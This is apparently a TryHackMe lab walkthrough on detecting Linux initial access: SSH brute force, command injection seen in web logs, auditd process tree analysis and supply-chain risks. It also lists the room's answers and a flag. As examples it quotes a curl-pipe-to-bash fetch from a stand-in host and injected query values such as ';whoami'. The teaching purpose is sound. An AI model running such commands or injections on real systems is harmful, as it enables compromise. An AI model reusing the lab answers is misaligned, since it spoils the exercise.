---
icon: linux
cover: >-
  https://tryhackme-images.s3.eu-west-1.amazonaws.com/room-icons/678ecc92c80aa206339f0f23-1757085800901
coverY: 0
coverHeight: 138
---

# Linux Threat Detection 1

**Date:** 05.05.2026&#x20;

**Room Category:** Walkthrough&#x20;

**Core Concept:** Exploring common Initial Access techniques on Linux systems, including SSH brute-forcing, exploiting exposed services, and utilizing process tree analysis for detection.

While Linux environments are increasingly prevalent in cloud computing and enterprise servers, breaches typically originate from common, well-known Initial Access vectors. This document outlines the methodologies for detecting these initial footholds using native Linux log sources and process tracing techniques.

***

## Task 1: Introduction

The primary objective is to understand how attackers break into Linux systems and how these breaches manifest in system logs. The focus is on the role of SSH, the risks of internet-exposed services, and the use of process tree analysis to identify the attack's origin.

Question: I'm ready to start!

> **Answer:** No answer needed

***

## Task 2: Initial Access via SSH

SSH (Secure Shell) is the most common remote access service for Linux environments. With millions of internet-facing SSH servers, it is a prime target for threat actors, tracked under the External Remote Services (T1133) MITRE technique.

<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

**Authentication Risks:**

* **Key-Based Authentication Risks:** Threat actors may steal private SSH keys stored insecurely in source code repositories (e.g., GitHub), automation servers (e.g., Ansible), or by infecting an administrator's workstation with an information stealer.
* **Password-Based Authentication Risks:** Administrators may set weak passwords for temporary testing, provide weak credentials to contractors, or accidentally expose outdated servers to the internet without implementing strict access controls.

Breaches often begin with extensive botnets scanning for exposed SSH ports and executing automated brute-force attacks to guess weak credentials.

**Practical Investigation Commands:** To find the first login for the `ubuntu` user, check the authentication logs:

```bash
# Filter for successful logins and find the earliest entry for ubuntu
grep "Accepted" /var/log/auth.log | grep "ubuntu" | head -n 1
```

Question: When did the ubuntu user log in via SSH for the first time?

> **Answer:** 2024-10-22

Question: Did the ubuntu user use SSH keys instead of a password for the above found date? (Yea/Nay)

> **Answer:** Yea

***

## Task 3: Detecting SSH Attacks

Detecting an SSH breach relies heavily on analyzing the `/var/log/auth.log` file. A classic attack pattern involves a high volume of failed authentication attempts (brute force) immediately followed by a successful login.

<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

**Distinguishing Legitimate vs. Malicious Logins:** When reviewing successful SSH logins (filtering for `Accepted`), several red flags indicate a potential compromise:

* **Authentication Method:** Password-based authentication is inherently more suspicious than public-key authentication, especially from unknown sources.
* **Source IP:** Logins originating from external, untrusted IP addresses (which can be verified against Threat Intelligence tools) warrant investigation.
* **Login History & Timing:** Logins occurring outside of standard working hours or immediately preceded by numerous `Failed password` events point strongly to a successful brute-force attack.

**Practical Investigation Commands:**

1.  **Find the start of the brute force:**

    ```bash
    grep "Failed password" /var/log/auth.log | head -n 5
    ```
2.  **Identify targeted users:**

    ```bash
    grep "Failed password" /var/log/auth.log | awk '{print $(NF-5)}' | sort -u
    ```
3.  **Locate the successful breach of root:**

    ```bash
    grep "Accepted password for root" /var/log/auth.log
    ```

Question: When did the SSH password brute force start?

> **Answer:** 2025-08-21

Question: Which four users did the botnet attempt to breach?

> **Answer:** root, roy, sol, user

Question: Finally, which IP managed to breach the root user?

> **Answer:** 91.224.92.79

***

## Task 4: Initial Access via Services

Linux systems frequently host public-facing services (web servers, email servers, databases, Docker APIs). A vulnerability in any exposed application puts the entire underlying host at risk, categorized under the Exploit Public-Facing Application (T1190) MITRE technique.

<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

**Utilizing Application Logs:** While application logs will not explicitly state that an exploit is occurring, they capture the artifacts of the attack. For instance, in a vulnerable web application (e.g., "TryPingMe") that executes system commands based on user input, web server access logs (`/var/log/nginx/access.log`) will reveal the exploitation.

**Command Injection Indicators in Web Logs:** If an application is vulnerable to command injection, the HTTP requests will often contain OS commands embedded within the query parameters.

```bash
10.14.105.255 - - [26/Aug/2025:20:09:49] "GET /ping?host=;whoami HTTP/1.1" 200 [...]
10.14.105.255 - - [26/Aug/2025:20:10:41] "GET /ping?host=;ls HTTP/1.1" 200 [...]
```

**Practical Investigation Commands:**

1.  **Find the file path in web logs:**

    ```bash
    cat /var/log/nginx/access.log | grep -i "py"
    ```
2.  **Retrieve the flag from the target file:**

    ```bash
    cat /opt/trypingme/main.py | grep -i "THM"
    ```

Question: What is the path to the Python file the attacker attempted to open?

> **Answer:** /opt/trypingme/main.py

Question: Looking inside the opened file, what's the flag you see there?

> **Answer:** THM{i\_am\_vulnerable!}

***

## Task 5: Detecting Service Breach

When application logs are unavailable or insufficient, process tree analysis serves as a universal approach for unwrapping Initial Access techniques.

<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

**Building a Process Tree with Auditd:** When a suspicious command (e.g., `whoami`) triggers an alert, it must be traced back to its parent process to determine if it originated from a legitimate administrator or a compromised service.

1.  **Locate the Suspicious Command:**

    ```bash
    ausearch -i -x whoami
    ```

    This identifies the command execution and provides its Parent Process ID (`ppid`).
2.  **Trace Up the Process Tree:**

    ```bash
    ausearch -i --pid [PPID]
    ```

    By iteratively querying the `ppid` of each result, the execution chain is traced backward. If the tree reveals that `whoami` was launched by a web server daemon or a Python web application, it strongly indicates a service breach.
3.  **List Sibling Processes:** To confirm malicious intent, analyze other commands launched by the same compromised parent process.

    ```bash
    ausearch -i --ppid [Compromised_App_PID] | grep 'proctitle'
    ```

Question: What is the PPID of the suspicious whoami command?

> **Answer:** 1018

Question: Moving up the tree, what is the PID of the TryPingMe app?

> **Answer:** 577

Question: Which program did the attacker use to open a reverse shell?

> **Answer:** Python

***

## Task 6: Advanced Initial Access

While less common than exposed service exploitation, Linux systems are still vulnerable to human-led errors and supply chain compromises.

<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

**Human-Led Attacks:** System administrators or developers may inadvertently execute malicious code by:

* Pasting untrusted scripts from forums directly into a terminal (`curl https://shadyforum.thm/fix.sh | bash`).
* Falling victim to typosquatting when installing packages (e.g., typing `pip3 install fastpi` instead of `fastapi`), installing malicious software prepared by threat actors.

**Supply Chain Compromise:** Attackers may compromise a widely used software library or dependency. When the software is updated on the target server, the malicious payload is delivered automatically (e.g., the XZ Utils backdoor or breaches of GitHub actions).

Regardless of the specific technique, process tree analysis remains the most effective detection method. Tracing an alert back to its origin distinguishes between a web attack (PHP running `whoami`), a supply chain compromise (an internal trusted service running `wget`), or an SSH breach (a cryptominer installed via an interactive SSH session).

Question: Which Initial Access technique is likely used if a trusted app suddenly runs malicious commands?

> **Answer:** Supply Chain Compromise

Question: Which detection method can you use to detect a variety of Initial Access techniques?

> **Answer:** Process Tree Analysis

***

## Conclusion

Initial Access techniques on Linux primarily target exposed services and SSH infrastructure. Process tree analysis, facilitated by runtime monitoring tools like `auditd`, is the most robust method for tracing suspicious commands back to their source, allowing analysts to accurately identify how an attacker breached the system.
